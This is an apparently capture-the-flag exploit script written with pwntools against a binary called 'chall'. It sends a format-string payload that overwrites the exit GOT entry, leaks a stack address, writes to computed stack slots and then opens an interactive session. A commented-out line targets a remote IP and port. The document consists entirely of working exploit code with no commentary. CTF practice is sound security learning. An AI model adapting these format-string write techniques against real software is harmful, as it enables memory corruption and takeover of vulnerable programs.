from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)

r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x0000000000401345
#            b*0x0000000000401396
#         #    b*0x0000000000401320
#            ''')

# r = remote('47.254.251.2', 4097)

payload =  b'%4662c%15$hn%11$p'.ljust(24, b'\x00') + p64(exe.got['exit'])

r.sendafter(b'name:\n', payload)
r.sendlineafter(b'gift:\n', b'0')
print(r.recv())
print(r.recvuntil(b'l'))
out = r.recv(14)
print(out)

stack = int(out, 16)
print(hex(stack))
ran = stack - 192
print(ran)

payload =  b'%14$n%15$n'.ljust(16, b'\x00') + p64(ran) + p64(ran + 8)

r.sendafter(b'name:\n', payload)
r.sendlineafter(b'gift:\n', b'0')

r.interactive()